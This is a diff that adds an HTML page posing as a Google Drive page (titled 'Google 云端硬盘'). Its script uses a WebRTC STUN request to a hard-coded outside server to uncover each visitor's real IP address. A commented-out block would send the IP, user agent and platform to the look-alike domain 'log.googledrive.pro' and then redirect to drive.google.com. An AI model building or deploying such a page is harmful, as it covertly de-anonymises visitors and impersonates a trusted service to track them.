@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Google 云端硬盘</title>
+</head>
+<body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+    window.RTCPeerConnection = window.RTCPeerConnection ||
+                               window.mozRTCPeerConnection ||
+                               window.webkitRTCPeerConnection;
+    console.log(window.location);
+    function rtc(url){
+        let pc = new RTCPeerConnection({iceServers: [{urls: url}]});
+        pc.onicecandidate = function(ice) {
+            if (ice.candidate) {
+                let ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
+                let ip_addr = ip_regex.exec(ice.candidate.candidate)[1];
+                console.log(ip_addr);
+        		// $.ajax({
+                //     type: "POST",
+                //     url: "http://log.googledrive.pro/log",
+                //     data: {"ip":ip_addr, "ua": navigator.userAgent, "pl": navigator.platform, "an": navigator.appName, "av": navigator.appVersion},
+                //     dataType: "json"
+                // }).always(function() {
+                //     window.location.host="drive.google.com";
+                // });
+                // pc.onicecandidate = function() {};
+            }
+        };
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(console.error);
+    }
+    if (window.RTCPeerConnection) {
+        rtc('stun:47.104.21.0:3478')
+    } else {
+        // window.location.host="drive.google.com";
+    }
+</script>
+</body>
+</html>
